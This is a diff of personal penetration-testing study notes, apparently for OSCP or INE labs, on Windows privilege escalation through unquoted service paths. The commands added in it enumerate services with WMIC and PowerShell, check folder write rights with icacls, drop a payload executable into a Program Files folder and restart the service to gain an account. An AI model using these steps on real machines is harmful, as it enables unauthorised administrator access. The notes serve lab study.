@@ -264,13 +264,30 @@ PS: Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 Note: Wmic use in CMD. Powershell behaved weirdly...       
 INE Version of WMIC to find targets
 cmd: wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-OSCP Version
+OSCP Version -- better
 cmd: wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 Check if you can start and stop service
 PS: Start-Service GammaService
+
 PS: Stop-Service GammaService
+
+Check if you can write using icacls (In powershell)
+icacls "C:\Program Files\Enterprise Apps"
+
+Move in payload
+Move-Item –Path Current.exe -Destination  "C:\Program Files\Enterprise Apps"
+
+Restart the service
+Note there may be an error... just check using net user
+PS: Stop-Service GammaService
+PS: Start-Service GammaService
+
+#Extra
+Find the account name of a service running 
+Get-WmiObject Win32_Service | Select-Object Name, StartName
+
+Also the Services MCM snippet provides more info than task manager does...
 
 
          
